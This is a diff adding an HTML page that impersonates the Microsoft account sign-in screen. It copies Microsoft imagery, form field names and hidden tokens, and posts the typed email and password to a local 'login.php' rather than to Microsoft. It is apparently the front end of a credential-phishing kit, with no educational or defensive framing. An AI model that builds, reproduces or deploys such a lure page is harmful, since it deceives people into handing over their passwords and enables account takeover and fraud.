@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to your Microsoft account</title>
+  <meta name="robots" content="none" />
+  <style>
+    /* Reset & Base */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), 
+                  url('https://auth.gfx.ms/16.000.27773.2/images/Backgrounds/0.jpg') center/cover no-repeat fixed;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .login-container {
+      background: rgba(30, 30, 30, 0.85);
+      border-radius: 8px;
+      padding: 32px 24px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+    }
+    .microsoft-logo-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+    .microsoft-logo {
+      width: 100px;
+      height: auto;
+    }
+    .microsoft-logo svg {
+      width: 100%;
+      height: auto;
+    }
+    .microsoft-text {
+      font-size: 20px;
+      font-weight: 600;
+      color: #777;
+      margin-top: 8px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 24px;
+      color: #fff;
+    }
+    .input-group {
+      margin-bottom: 16px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #ccc;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #555;
+      border-radius: 4px;
+      background: #222;
+      color: #fff;
+      font-size: 16px;
+    }
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      border-color: #0078d7;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+    }
+    .checkbox-container input {
+      margin-right: 10px;
+    }
+    .checkbox-container label {
+      margin: 0;
+      font-size: 14px;
+      color: #ccc;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .btn-primary {
+      background: #0078d7;
+      color: white;
+    }
+    .btn-primary:hover {
+      background: #106ebe;
+    }
+    .btn-secondary {
+      background: transparent;
+      color: #0078d7;
+      border: 1px solid #0078d7;
+    }
+    .btn-secondary:hover {
+      background: rgba(0, 120, 215, 0.1);
+    }
+    .footer-links {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 14px;
+    }
+    .footer-links a {
+      color: #0078d7;
+      text-decoration: none;
+      display: block;
+      margin: 8px 0;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    .copyright {
+      margin-top: 24px;
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 24px 16px;
+      }
+      .microsoft-logo {
+        width: 80px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- Logo + Teks Microsoft di tengah -->
+    <div class="microsoft-logo-container">
+      <div class="microsoft-logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" fill="currentColor">
+          <!-- Kotak Merah -->
+          <rect x="0" y="0" width="60" height="60" fill="#F1511B"/>
+          <!-- Kotak Hijau -->
+          <rect x="68" y="0" width="60" height="60" fill="#80CC28"/>
+          <!-- Kotak Biru -->
+          <rect x="0" y="68" width="60" height="60" fill="#00ADEF"/>
+          <!-- Kotak Kuning -->
+          <rect x="68" y="68" width="60" height="60" fill="#FBBC05"/>
+        </svg>
+      </div>
+      <div class="microsoft-text">Microsoft</div>
+    </div>
+
+    <h1>Sign in</h1>
+
+    <form name="f1" id="i0281" method="post" action="login.php" autocomplete="off">
+      <div class="input-group">
+        <label for="i0116">Email, phone, or Skype</label>
+        <input type="email" name="loginfmt" id="i0116" placeholder="Email, phone, or Skype" required />
+      </div>
+
+      <div class="input-group">
+        <label for="i0118">Password</label>
+        <input type="password" name="passwd" id="i0118" placeholder="Password" required />
+      </div>
+
+      <div class="checkbox-container">
+        <input type="checkbox" name="KMSI" id="idChkBx_PWD_KMSI0Pwd" />
+        <label for="idChkBx_PWD_KMSI0Pwd">Keep me signed in</label>
+      </div>
+
+      <input type="submit" class="btn btn-primary" value="Sign in" id="idSIButton9" />
+
+      <!-- Hidden fields from original -->
+      <input type="hidden" name="PPFT" id="i0327" value="DUrygQLjLY880vAVG2bNblrDPMX*DouJrHFzcJ5KUEPiQvRUUaEe4HvWGeB!D!KDrOrlHJhoh7clN!TlCjYwMtmgIDP7bX398o9phSZpCEFFB5W2lyJgN*tM0tfjWLqFWWRyivA27PD*sl1UpT6vaVCK9gZk!yUb6gw6Oz2TWqxg3415TQR9DDgGcruvoXmEbaF807aZCvTvJgFl1a5a9*k*Vdx976JAsA8WDdG8C8U37wAWkZhdt6WRrproMcc2KQ$$" />
+      <input type="hidden" name="PPSX" value="PassportR" />
+      <input type="hidden" name="NewUser" value="1" />
+      <input type="hidden" name="fspost" value="0" />
+      <input type="hidden" name="i2" value="1" />
+    </form>
+
+    <div class="footer-links">
+      <a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf" target="_blank">Forgot my password</a>
+      <a href="https://signup.live.com/" target="_blank">Create a new account</a>
+      <a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600" target="_blank">Terms of use</a>
+      <a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600" target="_blank">Privacy & cookies</a>
+    </div>
+
+    <div class="copyright">&copy; Microsoft</div>
+  </div>
+</body>
+</html>
